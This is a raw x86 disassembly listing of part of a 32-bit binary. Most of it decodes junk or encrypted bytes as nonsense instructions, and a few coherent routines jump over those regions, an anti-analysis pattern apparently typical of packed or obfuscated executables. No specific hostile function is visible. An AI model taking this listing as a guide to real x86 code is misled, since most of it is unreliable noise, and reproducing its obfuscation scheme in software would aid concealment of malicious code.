  40eb98:	mov    esi,DWORD PTR [ebp-0x8]
  40eb9b:	adc    ecx,edx
  40eb9d:	mov    edx,0x7510854
  40eba2:	jmp    0x40ed99
  40eba7:	imul   ebx,DWORD PTR [ebx+0x72cf420f],0x73
  40ebae:	mov    bl,0xda
  40ebb0:	jecxz  0x40eb5f
  40ebb2:	sbb    cl,BYTE PTR [ecx]
  40ebb4:	cmp    ah,0xd9
  40ebb7:	call   0x7e7f:0x547e7ea5
  40ebbe:	jle    0x40ec18
  40ebc0:	div    DWORD PTR [ebx]
  40ebc2:	jae    0x40ec1e
  40ebc4:	ds push ds
  40ebc6:	jns    0x40ec21
  40ebc8:	xchg   ebx,eax
  40ebc9:	inc    ecx
  40ebca:	call   0x7267:0x3156185f
  40ebd1:	mov    gs,ebx
  40ebd3:	aad    0xdc
  40ebd5:	push   esp
  40ebd6:	xor    dh,BYTE PTR [edi+0x53df49cc]
  40ebdc:	popf   
  40ebdd:	rcl    DWORD PTR [edx-0x21],0x35
  40ebe1:	ds jo  0x40eb67
  40ebe4:	loope  0x40ec59
  40ebe6:	mov    al,0x59
  40ebe8:	add    DWORD PTR ss:[eax],esi
  40ebeb:	adc    al,0x9b
  40ebed:	in     al,0xe9
  40ebef:	xlat   BYTE PTR ds:[ebx]
  40ebf0:	leave  
  40ebf1:	lds    edx,FWORD PTR [eax+0x50dadc23]
  40ebf7:	and    edi,esp
  40ebf9:	not    dl
  40ebfb:	lock push ebp
  40ebfd:	test   al,0x5a
  40ebff:	jne    0x40ec22
  40ec01:	cmp    DWORD PTR [edi+0x1b703c23],ebp
  40ec07:	data16 repz adc BYTE PTR [eax+0x3c4424c3],0x2d
  40ec10:	call   0xe71e713c
  40ec15:	icebp  
  40ec16:	and    DWORD PTR [edx+edx*4+0x26],esp
  40ec1a:	adc    esp,DWORD PTR [ebp-0x38f2776]
  40ec20:	das    
  40ec21:	inc    edi
  40ec22:	add    esi,DWORD PTR [ebx]
  40ec24:	sbb    dh,BYTE PTR [esi]
  40ec26:	shl    DWORD PTR ss:[esp+esi*4],0x3c
  40ec2b:	cmp    BYTE PTR [edi+0x21f8f49],dh
  40ec31:	clc    
  40ec32:	ins    BYTE PTR es:[edi],dx
  40ec33:	not    eax
  40ec35:	leave  
  40ec36:	lock repz mov WORD PTR [esp+eax*2+0x739e7f92],fs
  40ec3f:	mov    ebp,ebp
  40ec41:	(bad)
  40ec44:	push   edi
  40ec45:	fprem1 
  40ec47:	sub    edx,ebp
  40ec49:	mov    dh,0xd7
  40ec4b:	jae    0x40ec98
  40ec4d:	gs mov ch,0x46
  40ec50:	loop   0x40ebf9
  40ec52:	icebp  
  40ec53:	cdq    
  40ec54:	pop    es
  40ec55:	into   
  40ec56:	dec    esp
  40ec57:	lods   eax,DWORD PTR ds:[esi]
  40ec58:	mov    al,ds:0x9d748bc1
  40ec5d:	mov    dh,0xcf
  40ec5f:	push   esp
  40ec60:	(bad)  
  40ec62:	mov    al,ds:0x9a78a522
  40ec67:	mov    gs,WORD PTR gs:[eax-0x7eb0ae2c]
  40ec6e:	push   edx
  40ec6f:	mov    esp,0x86db3777
  40ec74:	je     0x40ecab
  40ec76:	xchg   ebp,eax
  40ec77:	cmp    edx,ecx
  40ec79:	lock mov ah,0x94
  40ec7c:	cmp    DWORD PTR [ebp+ecx*1-0x43],0x29
  40ec81:	jmp    0xa1ec:0x7960cf6a
  40ec88:	jle    0x40ecb0
  40ec8a:	mov    dl,BYTE PTR [ecx+0x534e72ba]
  40ec90:	pushf  
  40ec91:	dec    ecx
  40ec92:	outs   dx,BYTE PTR ds:[esi]
  40ec93:	out    dx,eax
  40ec94:	cmp    DWORD PTR [ebx-0x423f21ad],0x15
  40ec9b:	push   edx
  40ec9c:	sbb    DWORD PTR [esi-0x45],esi
  40ec9f:	mov    DWORD PTR [eax],ecx
  40eca1:	xchg   DWORD PTR [ebx+0x38],edi
  40eca4:	cli    
  40eca5:	in     eax,0x96
  40eca7:	stc    
  40eca8:	sbb    dl,BYTE PTR [ebx+0x68b1ae73]
  40ecae:	sbb    eax,0x65cf94a9
  40ecb3:	out    dx,al
  40ecb4:	dec    eax
  40ecb5:	push   esp
  40ecb6:	stc    
  40ecb7:	call   0x45a10d0c
  40ecbc:	xlat   BYTE PTR ds:[ebx]
  40ecbd:	mov    eax,ds:0x3475f7d3
  40ecc2:	imul   eax,DWORD PTR [edx-0x3ae9a2d1],0x5f1cc5da
  40eccc:	xchg   ebx,eax
  40eccd:	in     al,0x6d
  40eccf:	shr    cl,0x2f
  40ecd2:	xchg   esp,eax
  40ecd3:	jl     0x40ec81
  40ecd5:	add    bl,dh
  40ecd7:	add    eax,0xd104e488
  40ecdc:	imul   edx,DWORD PTR [edx+0x5eadeb08],0x2b5faf3
  40ece6:	push   ss
  40ece7:	in     al,dx
  40ece8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ece9:	fwait
  40ecea:	xchg   BYTE PTR [ebp+0x6a64e050],bl
  40ecf0:	dec    esp
  40ecf1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ecf2:	mov    ds:0xcbd78807,al
  40ecf7:	fidivr DWORD PTR [ecx]
  40ecf9:	inc    ebx
  40ecfa:	add    ebx,ecx
  40ecfc:	push   ss
  40ecfd:	pop    edi
  40ecfe:	or     al,0xd6
  40ed00:	jg     0x40ed04
  40ed02:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ed03:	(bad)  
  40ed04:	jnp    0x40ecb9
  40ed06:	xchg   ecx,eax
  40ed07:	cmp    al,0x9b
  40ed09:	mov    eax,0x23c73d30
  40ed0e:	(bad)  
  40ed0f:	ficom  WORD PTR [esi-0x64]
  40ed12:	les    esi,FWORD PTR [ecx+0x187a539e]
  40ed18:	rcr    BYTE PTR [esi+0x5b],cl
  40ed1b:	into   
  40ed1c:	xor    bl,BYTE PTR [edx]
  40ed1e:	jne    0x40ed5d
  40ed20:	icebp  
  40ed21:	fsubr  st,st(3)
  40ed23:	or     al,0xad
  40ed25:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ed26:	push   cs
  40ed27:	jmp    0x40ed5d
  40ed29:	jle    0x40ed08
  40ed2b:	inc    edi
  40ed2c:	cdq    
  40ed2d:	inc    ecx
  40ed2e:	jl     0x40ed7b
  40ed30:	add    ebp,DWORD PTR [esi]
  40ed32:	xor    dh,cl
  40ed34:	add    esi,DWORD PTR [ebp-0x58e47742]
  40ed3a:	inc    ebx
  40ed3b:	sub    DWORD PTR [ebp-0x3e78b016],0x354adcf5
  40ed45:	leave  
  40ed46:	sub    cl,BYTE PTR [eax+0x75]
  40ed49:	(bad)  
  40ed4a:	js     0x40ed69
  40ed4c:	ins    DWORD PTR es:[edi],dx
  40ed4d:	repnz int3 
  40ed4f:	jecxz  0x40eceb
  40ed51:	jg     0x40edc7
  40ed53:	fdivrp st(2),st
  40ed55:	or     BYTE PTR [edx-0x8],dl
  40ed58:	ror    DWORD PTR [edx-0x3b38214a],1
  40ed5e:	and    cl,BYTE PTR [edx-0x67163f82]
  40ed64:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ed65:	mov    esi,0xffd278b8
  40ed6a:	xchg   esi,eax
  40ed6b:	inc    esi
  40ed6c:	mov    BYTE PTR [ebp+0x55],dl
  40ed6f:	push   cs
  40ed70:	cdq    
  40ed71:	test   al,0x3d
  40ed73:	sbb    ecx,ebp
  40ed75:	loop   0x40ecfa
  40ed77:	and    DWORD PTR [edx+ebp*2],0x70
  40ed7b:	addr16 inc edx
  40ed7d:	or     al,0x22
  40ed7f:	push   cs
  40ed80:	inc    edx
  40ed81:	dec    ebp
  40ed82:	aad    0xd2
  40ed84:	push   ss
  40ed85:	out    0x44,al
  40ed87:	adc    BYTE PTR [edi+0x6f],dh
  40ed8a:	gs repnz fwait
  40ed8d:	jmp    0x40eddf
  40ed8f:	(bad)  
  40ed90:	in     eax,dx
  40ed91:	push   edi
  40ed92:	push   ss
  40ed93:	or     ecx,esp
  40ed95:	or     BYTE PTR [edx-0x7e],0xad
  40ed99:	xor    eax,edx
  40ed9b:	sub    ecx,DWORD PTR ds:0x433653
  40eda1:	xor    esi,edx
  40eda3:	mov    DWORD PTR ds:0x4336d3,0x18
  40edad:	cmp    DWORD PTR ds:0x4336d3,0x0
  40edb4:	je     0x40edf4
  40edba:	cmp    DWORD PTR ds:0x4336d3,0x20
  40edc1:	jne    0x40ede2
  40edc7:	push   DWORD PTR [ebp-0x14]
  40edca:	push   DWORD PTR [ebp-0xc]
  40edcd:	push   0x5135
  40edd2:	push   0x2d1e
  40edd7:	push   0x400000
  40eddc:	call   DWORD PTR ds:0x4120f0
  40ede2:	mov    ecx,DWORD PTR ds:0x4336d3
  40ede8:	dec    ecx
  40ede9:	mov    DWORD PTR ds:0x4336d3,ecx
  40edef:	jmp    0x40edad
  40edf4:	mov    ecx,0x32729b
  40edf9:	add    esi,ecx
  40edfb:	add    eax,ecx
  40edfd:	imul   eax,esi
  40ee00:	mov    esi,DWORD PTR [ebp+0xc]
  40ee03:	cmp    esi,eax
  40ee05:	jne    0x40ee21
  40ee0b:	mov    eax,DWORD PTR [ebp-0x4]
  40ee0e:	mov    esi,DWORD PTR [ebp-0x8]
  40ee11:	xor    eax,edx
  40ee13:	xor    esi,edx
  40ee15:	add    eax,ecx
  40ee17:	add    esi,ecx
  40ee19:	imul   eax,esi
  40ee1c:	jmp    0x40f053
  40ee21:	mov    eax,DWORD PTR [ebp+0xc]
  40ee24:	mov    eax,DWORD PTR [eax+0x78]
  40ee27:	mov    DWORD PTR [ebp+0xc],eax
  40ee2a:	mov    eax,DWORD PTR [ebp-0x4]
  40ee2d:	mov    esi,DWORD PTR [ebp-0x8]
  40ee30:	xor    eax,edx
  40ee32:	xor    esi,edx
  40ee34:	add    eax,ecx
  40ee36:	add    esi,ecx
  40ee38:	imul   eax,esi
  40ee3b:	mov    esi,DWORD PTR [ebp+0xc]
  40ee3e:	cmp    esi,eax
  40ee40:	mov    eax,DWORD PTR [ebp-0x4]
  40ee43:	je     0x40ee0e
  40ee49:	xor    eax,edx
  40ee4b:	add    eax,ecx
  40ee4d:	mov    ecx,DWORD PTR [ebp+0xc]
  40ee50:	imul   eax,ecx
  40ee53:	add    eax,DWORD PTR [ebp+0x8]
  40ee56:	mov    DWORD PTR [ebp+0xc],eax
  40ee59:	jmp    0x40f050
  40ee5e:	mov    dl,0xbd
  40ee60:	push   0xffffffdc
  40ee62:	jno    0x40ee4d
  40ee64:	mov    al,0x51
  40ee66:	ja     0x40eebe
  40ee68:	sbb    edx,DWORD PTR [edx+0x4b2d404]
  40ee6e:	lock mov ds:0x7f547e7e,eax
  40ee74:	jle    0x40eef4
  40ee76:	jb     0x40ee46
  40ee78:	inc    edi
  40ee79:	cwde   
  40ee7a:	ins    DWORD PTR es:[edi],dx
  40ee7b:	add    DWORD PTR [ebp-0x2e],ecx
  40ee7e:	js     0x40eea2
  40ee80:	hlt    
  40ee81:	xor    DWORD PTR [edi+0x1c4074cb],0x3f8ce27b
  40ee8b:	jmp    0x18d6c2c6
  40ee90:	rcr    BYTE PTR [eax],0xda
  40ee93:	or     al,0x99
  40ee95:	fnstenv [ebp-0x3c95d4b8]
  40ee9b:	and    ah,BYTE PTR [edx]
  40ee9d:	jbe    0x40eeb7
  40ee9f:	jl     0x40ee46
  40eea1:	add    DWORD PTR [esi+esi*4+0x2e],edx
  40eea5:	hlt    
  40eea6:	aaa    
  40eea7:	pop    eax
  40eea8:	out    0x55,eax
  40eeaa:	je     0x40eeec
  40eeac:	mov    ebp,0x53857be9
  40eeb1:	xor    eax,0x56a84d70
  40eeb6:	mov    DWORD PTR ds:0x6cedeed6,ecx
  40eebc:	and    DWORD PTR [edx-0x9a11b39],ecx
  40eec2:	bswap  ecx
  40eec4:	scas   al,BYTE PTR es:[edi]
  40eec5:	add    bh,al
  40eec7:	jmp    0x9dee:0x62bdd84d
  40eece:	sbb    eax,0x4d906f51
  40eed3:	test   BYTE PTR [eax-0x45],dh
  40eed6:	cmp    esi,DWORD PTR [edi+0x76a7da79]
  40eedc:	mov    edi,0x6ddb508f
  40eee1:	pop    ss
  40eee2:	xor    al,0xfb
  40eee4:	mov    ds:0x98ff95f,eax
  40eee9:	pusha  
  40eeea:	jns    0x40ef64
  40eeec:	out    0x19,al
  40eeee:	or     ecx,edx
  40eef0:	test   bl,dh
  40eef2:	sub    eax,DWORD PTR [ecx-0x72c94c30]
  40eef8:	jns    0x40ef25
  40eefa:	adc    BYTE PTR [ebx+0x733313d8],0x39
  40ef01:	sub    edi,edi
  40ef03:	xchg   BYTE PTR [eax],dl
  40ef05:	sub    DWORD PTR [edx-0x19dd0347],ebp
  40ef0b:	popf   
  40ef0c:	dec    ebx
  40ef0d:	sbb    eax,0x605a4566
  40ef12:	test   edi,ebx
  40ef14:	out    0x9e,al
  40ef16:	je     0x40ef7a
  40ef18:	push   0x1dd3e6f7
  40ef1d:	push   ss
  40ef1e:	fbstp  TBYTE PTR [ebx+ecx*8-0x29]
  40ef22:	(bad)  
  40ef23:	out    dx,eax
  40ef24:	cmp    ecx,edi
  40ef26:	mov    ecx,0x16638b03
  40ef2b:	and    bl,ah
  40ef2d:	pop    ds
  40ef2e:	es rcr ch,1
  40ef31:	inc    ebp
  40ef32:	(bad)  
  40ef33:	scas   eax,DWORD PTR es:[edi]
  40ef34:	xor    eax,0x3cf94c5
  40ef39:	and    esp,ebx
  40ef3b:	sti    
  40ef3c:	sbb    BYTE PTR [edx],ah
  40ef3e:	data16 xchg al,al
  40ef41:	sub    DWORD PTR [edx+0x2e166fb2],0x6e
  40ef48:	andps  xmm7,XMMWORD PTR [ecx]
  40ef4b:	fisttp WORD PTR [edx-0x74]
  40ef4e:	sub    BYTE PTR [ecx],ch
  40ef50:	cmc    
  40ef51:	ja     0x40ef88
  40ef53:	or     DWORD PTR [ebx-0x2464f023],ebx
  40ef59:	cs rcr al,cl
  40ef5c:	mov    WORD PTR [ebp+eiz*8+0xd15294c],ds
  40ef63:	mov    eax,0xcd8a23ff
  40ef68:	push   eax
  40ef69:	(bad)  
  40ef6b:	xchg   esi,eax
  40ef6c:	sbb    eax,0x2d1ff415
  40ef71:	pop    edi
  40ef72:	xchg   BYTE PTR [edx+ebp*8],dl
  40ef75:	rcl    BYTE PTR [ebp+0x74],0x16
  40ef79:	pop    edx
  40ef7a:	dec    ebp
  40ef7b:	mov    esi,0xec50a087
  40ef80:	call   0x6cb79bb
  40ef85:	ins    BYTE PTR es:[edi],dx
  40ef86:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ef87:	and    ebx,0x709a055c
  40ef8d:	inc    edi
  40ef8e:	xor    esi,DWORD PTR [edx]
  40ef90:	mov    esp,0xd24ab9e1
  40ef95:	imul   ecx,edx,0x56
  40ef98:	mov    al,0x3d
  40ef9a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ef9b:	sbb    ch,BYTE PTR [ebx]
  40ef9d:	ficom  DWORD PTR [esi-0x21b0c380]
  40efa3:	mov    ds,WORD PTR [ecx+0x2e17c4f]
  40efa9:	xor    eax,0x36043966
  40efae:	inc    edi
  40efaf:	scas   eax,DWORD PTR es:[edi]
  40efb0:	popf   
  40efb1:	test   DWORD PTR [esi-0x1d],esp
  40efb4:	adc    edx,ebp
  40efb6:	in     eax,0xab
  40efb8:	test   BYTE PTR [eax+0x72],dl
  40efbb:	push   ebx
  40efbc:	mov    WORD PTR [esi],es
  40efbe:	rol    BYTE PTR [ebp+0x746c3524],cl
  40efc4:	sbb    DWORD PTR ds:[eax],0xffffffaa
  40efc8:	in     al,0x52
  40efca:	and    BYTE PTR [eax],al
  40efcc:	call   0x88ae6e55
  40efd1:	cmp    esp,DWORD PTR ds:0x9f289c92
  40efd7:	icebp  
  40efd8:	pushf  
  40efd9:	call   0xc888cd60
  40efde:	fisub  WORD PTR [edx]
  40efe0:	inc    esp
  40efe1:	pop    edi
  40efe2:	ret    0xa37d
  40efe5:	and    al,0x98
  40efe7:	retf   
  40efe8:	push   cs
  40efe9:	add    eax,0x955fdb62
  40efee:	clc    
  40efef:	mov    ds:0x94a60f25,al
  40eff4:	or     bl,BYTE PTR ds:0xcd8f235b
  40effa:	or     DWORD PTR [esi+0x51],ecx
  40effd:	fmul   st,st(5)
  40efff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f000:	mov    ebx,0xb0190b44
  40f005:	sti    
  40f006:	enter  0x3930,0xd7
  40f00a:	sbb    bh,BYTE PTR [edi]
  40f00c:	and    ch,BYTE PTR [edi+0x38775fa8]
  40f012:	pop    ss
  40f013:	dec    edi
  40f014:	or     BYTE PTR [edi-0x61],bh
  40f017:	sub    edi,DWORD PTR [ebp-0x23]
  40f01a:	test   eax,0xfa2084c8
  40f01f:	or     BYTE PTR [edi+0x511a5f45],bh
  40f025:	sub    eax,0xd940def5
  40f02a:	cmp    edx,DWORD PTR [esi-0x41b63099]
  40f030:	call   0xd2531e91
  40f035:	jnp    0x40f06a
  40f037:	leave  
  40f038:	push   0xf88ffeb6
  40f03d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f03e:	popa   
  40f03f:	int3   
  40f040:	pop    ss
  40f041:	add    DWORD PTR [ebx+0x4fe29421],esi
  40f047:	and    ebx,0x1aa9d33f
  40f04d:	inc    eax
  40f04e:	fcmovnb st,st(1)
  40f050:	mov    eax,DWORD PTR [ebp+0xc]
  40f053:	pop    esi
  40f054:	leave  
  40f055:	ret    0x8
  40f058:	push   ebp
  40f059:	mov    ebp,esp
  40f05b:	push   ecx
  40f05c:	push   ecx
  40f05d:	inc    DWORD PTR ds:0x43369b
  40f063:	jmp    0x40f382
  40f068:	inc    ecx
  40f069:	iret   
  40f06a:	scas   al,BYTE PTR es:[edi]
  40f06b:	(bad)  
  40f06c:	mov    al,0x67
  40f06e:	jno    0x40f0b9
  40f070:	sub    DWORD PTR ds:0xb4011594,ebx
  40f076:	pusha  
  40f077:	mov    esi,0x7e7ea1d6
  40f07c:	jl     0x40f0fb
  40f07e:	jle    0x40f0fe
  40f080:	adc    al,0x13
  40f082:	adc    bh,bl
  40f084:	idiv   DWORD PTR [ebx-0x6e4ed367]
  40f08a:	xchg   edx,eax
  40f08b:	popf   
  40f08c:	cdq    
  40f08d:	or     al,0x68
  40f08f:	xchg   bh,ch
  40f091:	arpl   WORD PTR [eax+0x72],dx
  40f094:	mov    eax,0xd8517a0b
  40f099:	dec    DWORD PTR [edx+0x77a384b7]
  40f09f:	xchg   ecx,eax
  40f0a0:	mov    bh,0x8f
  40f0a2:	mov    esi,0x4d91045e
  40f0a7:	adc    eax,ebx
  40f0a9:	cdq    
  40f0aa:	jp     0x40f0e4
  40f0ac:	fcom   DWORD PTR ds:0xc5550e96
  40f0b2:	aaa    
  40f0b3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f0b4:	sbb    esp,DWORD PTR [edx]
  40f0b6:	push   ss
  40f0b7:	pop    es
  40f0b8:	cmp    BYTE PTR [ebx+0x44],cl
  40f0bb:	and    eax,0xd63c2b2
  40f0c0:	enter  0x88b6,0xdf
  40f0c4:	ss icebp 
  40f0c6:	cmp    ah,BYTE PTR [edx-0x5e]
  40f0c9:	mov    dh,0x4b
  40f0cb:	pop    ss
  40f0cc:	xor    ebx,DWORD PTR [eax]
  40f0ce:	push   es
  40f0cf:	sub    DWORD PTR [ecx+0x3bc80462],edi
  40f0d5:	fisubr WORD PTR [ebp-0x265f74b6]
  40f0db:	test   al,0x57
  40f0dd:	mov    al,ds:0x91153111
  40f0e2:	repz aam 0xfc
  40f0e5:	mov    esp,0x1275f6c8
  40f0ea:	test   BYTE PTR [eax+ebp*2-0x36af1ff1],0x7f
  40f0f2:	fnstcw WORD PTR [edx+0x58]
  40f0f5:	dec    esi
  40f0f6:	cmp    al,0xd5
  40f0f8:	sub    eax,0xe23c0d04
  40f0fd:	sbb    BYTE PTR [edi],bh
  40f0ff:	mov    ecx,0x9207171
  40f104:	dec    eax
  40f105:	xchg   esp,eax
  40f106:	scas   al,BYTE PTR es:[edi]
  40f107:	leave  
  40f108:	dec    ebp
  40f109:	aad    0x12
  40f10b:	or     eax,0xbca5b609
  40f110:	and    al,0x78
  40f112:	adc    BYTE PTR [ebp-0x617e9353],ch
  40f118:	fsub   QWORD PTR ds:0x3b099998
  40f11e:	xchg   ecx,eax
  40f11f:	push   0xf6dae7dc
  40f124:	push   esi
  40f125:	dec    eax
  40f126:	add    ebp,eax
  40f128:	sub    DWORD PTR [edx],ecx
  40f12a:	out    0x6f,eax
  40f12c:	sub    eax,0x563020a9
  40f131:	or     ecx,DWORD PTR [ecx+0xa]
  40f134:	pop    esi
  40f135:	cmp    bl,dl
  40f137:	addr16 int3 
  40f139:	cmp    eax,0x811a7921
  40f13e:	or     ebx,DWORD PTR [esi-0x2ad552bb]
  40f144:	add    BYTE PTR [esi],ah
  40f146:	cdq    
  40f147:	(bad)  
  40f148:	(bad)  
  40f14a:	fcom   DWORD PTR [esi-0x249650ae]
  40f150:	aam    0x3a
  40f152:	xchg   DWORD PTR [edi],esi
  40f154:	and    eax,0xf4617393
  40f159:	adc    al,0x62
  40f15b:	xor    al,BYTE PTR [ebp-0x4a]
  40f15e:	xor    ebp,esi
  40f160:	xlat   BYTE PTR ds:[ebx]
  40f161:	test   BYTE PTR ds:[ecx],cl
  40f164:	mov    bx,gs
  40f167:	cmp    DWORD PTR [ecx+ebp*2],ebp
  40f16a:	stc    
  40f16b:	xor    al,0x8f
  40f16d:	pop    ebx
  40f16e:	cld    
  40f16f:	mov    al,ds:0x9c2a628c
  40f174:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f175:	rcr    al,1
  40f177:	nop
  40f178:	mov    dh,0xc
  40f17a:	std    
  40f17b:	outs   dx,DWORD PTR ds:[esi]
  40f17c:	in     al,dx
  40f17d:	jae    0x40f155
  40f17f:	shr    DWORD PTR [edi-0x7488efc],1
  40f185:	sbb    ecx,DWORD PTR [ebp-0x7]
  40f188:	pop    ebp
  40f189:	sub    ebp,edi
  40f18b:	sbb    BYTE PTR [ebx+0x4982677],bl
  40f191:	call   0x9ed6993f
  40f196:	jecxz  0x40f14a
  40f198:	outs   dx,BYTE PTR ds:[esi]
  40f199:	mov    eax,DWORD PTR [eax]
  40f19b:	push   ds
  40f19c:	cmp    ah,BYTE PTR [ebp-0x73]
  40f19f:	ret    
  40f1a0:	xlat   BYTE PTR ds:[ebx]
  40f1a1:	(bad)  
  40f1a2:	fcmovne st,st(3)
  40f1a4:	jge    0x40f202
  40f1a6:	inc    ecx
  40f1a7:	mov    esi,0x29432c30
  40f1ac:	and    BYTE PTR [ebx],0x80
  40f1af:	xchg   ebp,eax
  40f1b0:	push   ebp
  40f1b1:	push   ss
  40f1b2:	sub    al,0x8f
  40f1b4:	aas    
  40f1b5:	retf   0xf034
  40f1b8:	mov    ah,BYTE PTR [esi]
  40f1ba:	repnz in al,dx
  40f1bc:	pop    edx
  40f1bd:	xchg   ebx,eax
  40f1be:	cmc    
  40f1bf:	fidiv  DWORD PTR [edx]
  40f1c1:	push   es
  40f1c2:	lahf   
  40f1c3:	rcl    BYTE PTR [edx+0xbf2d4ad],cl
  40f1c9:	sbb    ebp,DWORD PTR [ebx+0xf93393b]
  40f1cf:	and    BYTE PTR [edi],0xca
  40f1d2:	pop    es
  40f1d3:	loopne 0x40f24b
  40f1d5:	xchg   esp,eax
  40f1d6:	or     al,0x12
  40f1d8:	ret    
  40f1d9:	pop    es
  40f1da:	repnz xchg ebp,eax
  40f1dc:	mov    edx,0x34a4994e
  40f1e1:	pop    ecx
  40f1e2:	sbb    BYTE PTR [edi],0xb8
  40f1e5:	mov    esi,0xf30f2210
  40f1ea:	mov    ebp,0x367a1c5d
  40f1ef:	adc    al,dh
  40f1f1:	adc    al,0xa9
  40f1f3:	jne    0x40f18c
  40f1f5:	sub    al,0x19
  40f1f7:	fnstsw WORD PTR [edi+0x28]
  40f1fa:	std    
  40f1fb:	int3   
  40f1fc:	ret    0x4f4e
  40f1ff:	rol    DWORD PTR fs:[edi+0x10],1
  40f203:	or     bl,ch
  40f205:	dec    ecx
  40f206:	int    0x73
  40f208:	xchg   BYTE PTR [edx],cl
  40f20a:	dec    esp
  40f20b:	push   ds
  40f20c:	rol    BYTE PTR [ebx],1
  40f20e:	sbb    BYTE PTR [ebp-0x4ce88437],bl
  40f214:	and    dh,BYTE PTR ss:[edi-0x369e0110]
  40f21b:	push   ecx
  40f21c:	or     ah,BYTE PTR [ebx-0x374fbcd7]
  40f222:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f223:	mov    ebp,DWORD PTR [ebp-0x211e7ac4]
  40f229:	adc    cl,dh
  40f22b:	popa   
  40f22c:	fwait
  40f22d:	mov    edi,0xe7e932aa
  40f232:	lds    ebx,FWORD PTR [esi]
  40f234:	jns    0x13b60e5e
  40f23a:	jmp    0xd2a5:0x9cc3292f
  40f241:	sti    
  40f242:	out    dx,eax
  40f243:	dec    eax
  40f244:	xor    BYTE PTR [edx+0x49],bl
  40f247:	mov    WORD PTR [eax+0x251b0b8c],ds
  40f24d:	xor    dl,cl
  40f24f:	add    bh,dh
  40f251:	call   0x1439d4b5
  40f256:	popf   
  40f257:	add    esp,DWORD PTR [ebx+eiz*1-0x9]
  40f25b:	mov    al,0xb1
  40f25d:	je     0x40f27b
  40f25f:	or     DWORD PTR [edx+0x19],edi
  40f262:	out    dx,al
  40f263:	popa   
  40f264:	adc    DWORD PTR [edx],ecx
  40f266:	into   
  40f267:	ret    
  40f268:	repz iret 
  40f26a:	sar    dl,1
  40f26c:	fcomp  st(0)
  40f26e:	cmp    eax,0x64046c42
  40f273:	stos   BYTE PTR es:[edi],al
  40f274:	mov    al,0xfb
  40f276:	jae    0x40f25b
  40f278:	pop    eax
  40f279:	sub    ch,BYTE PTR [ebx]
  40f27b:	in     eax,0x8d
  40f27d:	lds    ebp,FWORD PTR [edi]
  40f27f:	sub    edx,eax
  40f281:	cmp    ecx,ebp
  40f283:	pop    edx
  40f284:	xor    DWORD PTR ds:0xfe6348d9,0x6b
  40f28b:	xor    cl,BYTE PTR [edx-0x15]
  40f28e:	or     dh,BYTE PTR [ecx+0x2a]
  40f291:	repz cdq 
  40f293:	pop    edi
  40f294:	xchg   ecx,eax
  40f295:	pop    edi
  40f296:	push   cs
  40f297:	dec    ecx
  40f298:	pop    esi
  40f299:	sub    al,BYTE PTR [esi]
  40f29b:	mov    DWORD PTR [ebx],ebp
  40f29d:	fild   QWORD PTR [edx-0x6]
  40f2a0:	jmp    0xbd5c:0x69f45003
  40f2a7:	shl    DWORD PTR [esi-0x67],cl
  40f2aa:	or     BYTE PTR [esi+0x19],dl
  40f2ad:	jecxz  0x40f2b7
  40f2af:	xchg   ecx,eax
  40f2b0:	mov    ch,0x1
  40f2b2:	xchg   edx,eax
  40f2b3:	sub    ah,cl
  40f2b5:	test   al,0x53
  40f2b7:	add    BYTE PTR [edx-0x25],dh
  40f2ba:	mov    edi,0x200a641c
  40f2bf:	lahf   
  40f2c0:	addr16 inc eax
  40f2c2:	push   ds
  40f2c3:	scas   al,BYTE PTR es:[edi]
  40f2c4:	je     0x40f327
  40f2c6:	daa    
  40f2c7:	pop    ebx
  40f2c8:	xor    esi,esp
  40f2ca:	xor    BYTE PTR [esi],cl
  40f2cc:	popf   
  40f2cd:	jmp    0xbe44:0xfcedbeec
  40f2d4:	pop    edx
  40f2d5:	cdq    
  40f2d6:	push   ebx
  40f2d7:	add    BYTE PTR [ebx+0xc],dl
  40f2da:	clc    
  40f2db:	mov    eax,ds:0xfdcae090
  40f2e0:	pop    ebx
  40f2e1:	fdiv   DWORD PTR [ebp+0x4566876f]
  40f2e7:	add    ebx,0x9b8b881a
  40f2ed:	jle    0x40f311
  40f2ef:	fwait
  40f2f0:	(bad)  
  40f2f1:	mov    ah,BYTE PTR [eax]
  40f2f3:	cmp    ch,BYTE PTR ds:0x2900416e
  40f2f9:	cmc    
  40f2fa:	xor    edi,DWORD PTR [ebp+0x58]
  40f2fd:	outs   dx,BYTE PTR ds:[esi]
  40f2fe:	mov    edx,0xb487b1d
  40f303:	mov    al,ds:0x40a7ce4e
  40f308:	retf   0xefaf
  40f30b:	aaa    
  40f30c:	popa   
  40f30d:	or     eax,ebp
  40f30f:	loope  0x40f2d0
  40f311:	lahf   
  40f312:	add    eax,0xbeb91b2b
  40f317:	or     DWORD PTR [edx-0x73],esi
  40f31a:	clc    
  40f31b:	call   0xa361:0xb3f72f22
  40f322:	test   al,0x5d
  40f324:	and    eax,0x37648eaa
  40f329:	aam    0xc4
  40f32b:	sub    al,0x36
  40f32d:	aas    
  40f32e:	and    esi,ebp
  40f330:	and    dl,BYTE PTR [edi]
  40f332:	repnz pop es
  40f334:	mov    ds:0x3d202466,al
  40f339:	push   esp
  40f33a:	push   ds
  40f33b:	scas   eax,DWORD PTR es:[edi]
  40f33c:	push   edi
  40f33d:	and    bh,BYTE PTR [ebx+esi*1-0x41d67b64]
  40f344:	adc    al,0xa6
  40f347:	ret    0x1adf
  40f34a:	es mov esi,0x4979b68f
  40f350:	fisubr DWORD PTR [esi]
  40f352:	add    DWORD PTR [edi],edx
  40f354:	nop
  40f355:	xlat   BYTE PTR ds:[ebx]
  40f356:	push   0xf4a4a61a
  40f35b:	xor    cl,BYTE PTR [esi+0x2824c9db]
  40f361:	in     eax,dx
  40f362:	mov    ebp,0xbd42a8c0
  40f367:	xchg   ebp,eax
  40f368:	outs   dx,BYTE PTR ds:[esi]
  40f369:	dec    edx
